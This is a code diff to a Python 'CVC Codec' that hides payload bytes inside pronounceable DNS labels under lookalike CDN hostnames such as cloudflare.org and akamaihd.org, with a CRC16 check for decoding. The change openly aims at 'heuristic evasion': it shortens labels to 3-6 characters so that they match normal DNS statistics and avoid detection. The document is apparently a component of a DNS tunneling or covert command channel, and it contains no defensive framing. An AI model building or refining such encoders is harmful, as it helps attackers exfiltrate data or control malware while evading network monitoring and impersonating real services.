@@ -1,11 +1,10 @@
-"""CVC Codec v2.1 - Compact Heuristic Evasion
+"""CVC Codec v2.2 - Short-Label Heuristic Evasion
 ============================================
 Features:
 - CRC16 checksum for payload validation
 - NO static delimiters
-- 7 syllables per label (21 chars = CDN-hash look)
-- Max 4-6 total labels per domain
-- Realistic DNS template patterns (no junk)
+- 1-2 syllables per label (3-6 chars, avg ~5 = normal DNS)
+- Realistic DNS template patterns
 """
 import random
 import struct
@@ -15,19 +14,13 @@ C_START = ['b', 'c', 'd', 'f', 'g', 'h', 'j', 'k', 'l', 'm', 'n', 'p', 'r', 's',
 VOWELS = ['a', 'e', 'i', 'o', 'u', 'y']
 C_END = ['b', 'c', 'd', 'f', 'g', 'k', 'l', 'm', 'n', 'p', 'r', 's', 't', 'x', 'z']
 
-# Syllables per DNS label (7 syllables = 21 chars, looks like CDN hash/token)
-SYLLABLES_PER_LABEL = 7
-
 # --- Realistic DNS Templates ---
-# {P} = payload labels (2-3 labels of 21 chars each)
-# Templates kept to 2-3 non-payload labels -> 4-6 total
+# {P} = payload labels (short 3-6 char labels joined by dots)
 TEMPLATES = [
-    # CDN-style (payload + 2 suffix = 4-5 total)
     "{P}.cloudflare.org",
     "{P}.akamaihd.org",
     "{P}.cloudfront.org",
     "{P}.fastly.org",
-    # Prefix + payload + suffix (1+payload+1 = 4-5 total)
     "static.{P}.org",
     "cdn.{P}.org",
     "dl.{P}.org",
@@ -38,9 +31,8 @@ TEMPLATES = [
     "ns.{P}.io",
 ]
 
-# Labels that are valid CVC but NOT payload (template parts / TLDs)
-TLD_BLACKLIST = {'com', 'net', 'biz', 'gov', 'mil', 'pub', 'top', 'win', 'xyz',
-                 'cdn', 'api', 'web', 'dev', 'app'}
+# NOTE: Templates use only .org/.io suffixes which are NOT valid CVC patterns,
+# so no blacklist is needed. CRC16 validates payload integrity.
 
 def _crc16(data: bytes) -> int:
     """CRC-16/CCITT-FALSE - Used to validate decoded payloads"""
@@ -114,16 +106,16 @@ def _bytes_to_cvc_labels(data: bytes) -> list:
     
     cvc_list.reverse()
     
-    # Group into labels (7 syllables per label = 21 chars, CDN-hash look)
+    # Group into labels of 1-2 syllables (3-6 chars) to match normal DNS avg
     labels = []
-    current_group = ""
-    for i, cvc in enumerate(cvc_list):
-        current_group += cvc
-        if (i + 1) % SYLLABLES_PER_LABEL == 0:
-            labels.append(current_group)
-            current_group = ""
-    if current_group:
-        labels.append(current_group)
+    i = 0
+    while i < len(cvc_list):
+        group_size = random.choice([1, 2])  # 1 syl = 3 chars, 2 syl = 6 chars
+        if i + group_size > len(cvc_list):
+            group_size = len(cvc_list) - i
+        label = ''.join(cvc_list[i:i + group_size])
+        labels.append(label)
+        i += group_size
     
     return labels
 
@@ -268,14 +260,10 @@ def decode_domain_to_bytes(domain_string: str, debug=False) -> bytes:
     if debug:
         print(f"[DECODE DEBUG] Domain parts: {parts}")
     
-    # Collect all pure CVC labels (skip junk with digits, skip non-CVC)
+    # Collect all pure CVC labels (skip non-CVC template/TLD labels)
     cvc_labels = []
     for label in parts:
-        # Skip blacklisted TLDs
-        if label in TLD_BLACKLIST:
-            continue
-        
-        # Skip labels containing ANY digit (that's the junk label)
+        # Skip labels containing ANY digit
         if any(c.isdigit() for c in label):
             continue
         
